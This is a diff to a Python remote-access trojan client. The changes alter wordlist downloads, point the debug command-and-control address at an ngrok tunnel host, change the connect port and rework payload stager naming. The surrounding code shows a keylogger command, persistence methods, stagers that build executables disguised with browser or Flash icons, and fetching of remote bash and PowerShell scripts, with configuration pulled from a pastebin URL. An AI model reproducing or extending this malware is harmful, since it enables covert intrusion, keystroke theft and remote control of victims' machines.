@@ -223,15 +223,6 @@ class Client(object):
             Client.debug("{} error: {}".format(Client._get_random_var.func_name, str(e)))
 
 
-    @staticmethod
-    def _get_top_passwords(n=10000):
-        try:
-            passlist = urllib.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt').read().split('\n')
-            return passlist[:int(n)]
-        except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_top_passwords.func_name, str(e)))
-
-
     @staticmethod            
     def _get_job_status(c):
         try:
@@ -399,12 +390,17 @@ class Client(object):
 
 
     def _get_config(self, *args, **kwargs):
+        # for debugging purposes only!
+        # TODO: move api keys to server and make requests requiring authorization on behalf of clients
         try:
             methods = self.persistence.methods.keys()
             config  = {'api': {}, 'resources': {}, 'tasks': {}}
             kwargs  = json.loads(urllib.urlopen(kwargs.get('config')).read()) if kwargs.get('config') else {}
             for method in methods:
                 self.persistence.methods[method].update({'platforms': getattr(self, '_persistence_add_{}'.format(method)).platforms})
+            wordlist_filenames = urllib.urlopen('https://raw.githubusercontent.com/digination/dirbuster-ng/master/wordlists/common.txt').read().splitlines()
+            wordlist_passwords = urllib.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt').read().splitlines()
+            config['resources']['wordlists'] = {'filenames': wordlist_filenames, 'passwords': wordlist_passwords}
             self._debug = True if bool('--debug' in sys.argv or 'debug' in sys.argv) else False
             if 'v' in kwargs:
                 v = kwargs.get('v')
@@ -452,10 +448,6 @@ class Client(object):
                 g = kwargs.get('g')
                 bash = urllib.urlopen(g).read()
                 config['resources']['bash'] = bash
-            if 'h' in kwargs:
-                h = kwargs.get('h')
-                wordlist = urllib.urlopen(h).read().splitlines()
-                config['resources']['wordlist'] = wordlist
             if 's' in kwargs:
                 s = kwargs.get('s')
                 powershell_script = urllib.urlopen(s).read()
@@ -1590,7 +1582,7 @@ class Client(object):
     def _server_addr(self, *args, **kwargs):
         try:
             if self._debug:
-                return socket.gethostbyname(socket.gethostname())
+                return '0.tcp.ngrok.io' #socket.gethostbyname(socket.gethostname())
             else:
                 req = urllib2.Request(self._config['api']['server']['endpoint'])
                 req.headers = {'API-Key': self._config['api']['server']['api_key']}
@@ -1639,7 +1631,7 @@ class Client(object):
                 self.debug('{} error: {}'.format(self._server_recv.func_name, str(e2)))
                 
  
-    def _server_connect(self, port=1337):
+    def _server_connect(self, port=13666):
         try:
             host = self._server_addr()
             self._session['connection'] = threading.Event()
@@ -2258,10 +2250,8 @@ class Client(object):
         try:
             args = args[0].split() if len(args) else []
             if args:
-                a = lambda: random.choice(('-','_',''))
-                b = lambda: random.choice((random.choice(self._config['resources']['wordlist']), random.choice(self._config['resources']['wordlist']).capitalize()))
                 if 'py' in args:
-                    name = str().join([b()] + [a() + b() for _ in range(2)])
+                    name = random.choice(self._config['resources']['wordlists']['filenames'])
                     path = os.path.join(os.path.expandvars('%TEMP%') if os.name is 'nt' else '/tmp', name + '.py')
                     path = self._payload_stager(name)
                 if 'exe' in args:
@@ -2269,9 +2259,10 @@ class Client(object):
                     path = self._payload_executable(path) if os.name is 'nt' else self._payload_application(path)
                 self._stagers[name] = path
                 return json.dumps({name: self._stagers.get(name)})
+            else:
+                return "usage: {}\n\t(add '-e/--executable' as final argument to compile a standalone executable)\n\ticons: java, flash, internet explorer, firefox, chrome, safari\n\texample: payload flash --executable".format(self.payload.usage)
         except Exception as e:
-            self.debug("{} error: {}".format(self.payload.func_name, str(e)))
-        return "usage: {}\n\t(add '-e/--executable' as final argument to compile a standalone executable)\n\ticons: java, flash, internet explorer, firefox, chrome, safari\n\texample: payload flash --executable".format(self.payload.usage)
+            return "{} error: {}".format(self.payload.func_name, str(e))
             
 
     @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
@@ -2511,4 +2502,4 @@ class Client(object):
 
 if __name__ == "__main__":
     payload = Client(config='https://pastebin.com/raw/si8MrN5X')
-    payload.run()
+    #payload.run()
